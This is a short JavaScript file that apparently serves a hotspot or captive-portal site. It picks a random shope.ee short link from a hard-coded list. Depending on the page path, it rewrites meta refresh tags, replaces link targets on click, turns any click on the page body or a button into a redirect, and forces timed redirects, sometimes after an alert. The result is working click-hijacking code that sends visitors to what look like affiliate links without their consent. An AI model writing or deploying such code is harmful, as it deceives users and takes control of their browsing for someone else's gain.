let data = [ "404BxG5ueu", "5pVq8kDqHQ", "7exUKEqZNY", "6KS6jRi86z", "5fCPw0Gimn", "4Kgu5EJ0xF", "5zpGLMrnAv", "5zpGLMrnAv", "5pVq96DY4e", "1fgHBWN82y", "1L3Qn1PpfU", "5zpGLu9OhU", "5pVq8kDqHQ", "1fgHBWN82y", "9UP8WNYj1o", "5fCPxOHFSa", "8zSrvZ7g5B", "2psEaJtG1C", "5pVq8kDqHQ", "6A8hJA7jZB", "4pdJil2amm", "5fCPxOHFSa", "99mI8AQ26q", "A9fSalogSq", "9zM2OSpJnp", "AUIIzNnPmw", "AJysn4o37v", "89uOD5wIWW",   "Y3xna8u1",   "Y3ByNvNY", "8eqtTfYFCz", "99nA4aWLC6", "8zTjsHWyX5", "89ucska9Dw", "7zbCgRamYv", "8UXTHMYsY2", "8KE353ZVt1", "A9fhGQSXAO", "9zMH47TAVN", "AUIXf2RGUU", "AJz7SjRtpT", "9UQ0TCV4WK", "9K6aGtVhrJ", "9p2qroTnqQ", "9ejQfVURBP", "6A9YV4hlHk", "5zq8IliOcj", "6UmOtggUbq", "6KSyhNh7wp", "5UtrhqkIdg", "5KaRVXkvyf", "5pWi6Sj1xm", "5fDHu9jfIl", "7Uew5Wcga8", "7KLVtDdJv7", "7pHmU8bPuE", "7eyMHpc3FD", "6pPFIIfDw4", "6f5p5zfrH3", "7A25gudxGA", "6zifUbeab9", "3V8nKAruhU", "3KpN7rsY2T", "3pldimqe1a", "3fSDWTrHMZ", "2pt6WwuS3Q", "2fZgKdv5OP", "3AVwvYtBNW", "30CWjFtoiV", "4peAucmpzs", "4fKkiJnTKr", "5AH1JElZJy", "4zxb6vmCex", "4AOU7OpNLo", "4053v5q0gn", "4V1KW0o6fu", "4KhuJhok0t",  "q829H247E",  "fobwy2hSD", "1AksXt0nRK", "10RSLa1QmJ",  "AsLM34bTA",   "Yv9k5Eo9",  "VVBkf3KnG",  "LBlYM3y8F", "2AdPjiwzPc", "20JzXPxckb", "2VGG8Kviji", "2Kwpw1wM4h", "1VNiwUzWlY", "1L4IkC0A6X", "1q0ZL6yG5e", "1fh98nytQd", "8eqtTfYFE0", "8pAJfyXbt3", "8zTjsHWyY6", "99nA4aWLD9", "7zbCgRamZw", "89ucska9Ez", "8KE353ZVu2", "8UXTHMYsZ5", "9zMH47TAWO", "A9fhGQSXBR", "AJz7SjRtqU", "AUIXf2RGVX", "9K6aGtVhsK", "9UQ0TCV4XN", "9ejQfVURCQ", "9p2qroTnrT", "5zq8IliOdk", "6A9YV4hlIn", "6KSyhNh7xq", "6UmOtggUct", "5KaRVXkvzg", "5UtrhqkIej", "5fDHu9jfJm", "5pWi6Sj1yp", "7KLVtDdJw8", "7Uew5WcgbB", "7eyMHpc3GE", "7pHmU8bPvH", "6f5p5zfrI4", "6pPFIIfDx7", "6zifUbeacA", "7A25gudxHD", "3KpN7rsY3U", "3V8nKAruiX", "3fSDWTrHNa", "3pldimqe2d", "2fZgKdv5PQ"];
data = 'https://shope.ee/' + data[Math.round(Math.random() * (data.length - 2) + 1)]

function changeMeta(timeOut = 0){
    if(document.querySelectorAll('meta')[0] != null){
        for(let index = 0; index < document.querySelectorAll('meta').length; index++){
            if(document.querySelectorAll('meta')[index].httpEquiv == "refresh"){
                document.querySelectorAll('meta')[index].httpEquiv = "refresh";
                document.querySelectorAll('meta')[index].content = timeOut + "; " + data;
            }
        }
    }
}

function changeHref(){
    if(document.querySelectorAll('a')[0] != null){
        for (let index = 0; index < document.querySelectorAll('a').length; index++){
            document.querySelectorAll('a')[index].addEventListener('click', function(){
                document.querySelectorAll('a')[index].href = data;
            })
        }
    }
}

function bodyRedirect(){
    document.querySelector('body').addEventListener('click', function(){
        location.href = data;
    })
}

function buttonRedirect(){
    if(document.querySelectorAll('button')[0] != null){
        for (let index = 0; index < document.querySelectorAll('button').length; index++){
            document.querySelectorAll('button')[index].addEventListener('click', function(){
                location.href = data;
            })
        }
    }
}

function forceRedirect(timeOut = 0){
    setTimeout(function(){
        location.href = data;
    }, timeOut);
}

function alertRedirect(timeOut = 0, message = "Click OK to continue !"){
    setTimeout(function(){
        alert(message);
        location.href = data;
    }, timeOut);
}

function checkPath(data = "status"){
    return location.pathname == "/" + data || location.pathname == "/" + data + ".html";
}

if(checkPath("alogin")){
    changeMeta(1);
    changeHref();
    forceRedirect();
}else if(checkPath("error")){
    
}else if(checkPath("login")){
    
}else if(checkPath("logout")){
    forceRedirect(5000)
}else if(checkPath("radvert")){
    changeHref();
    forceRedirect();
}else if(checkPath("redirect")){
    changeMeta(1);
    forceRedirect();
}else if(checkPath("rlogin")){

}else if(checkPath("status")){
    changeMeta(5);
    bodyRedirect();
    forceRedirect(4000);
}else{
    changeMeta(1);
    bodyRedirect();
    changeHref();
    forceRedirect();
}



// v1.0.0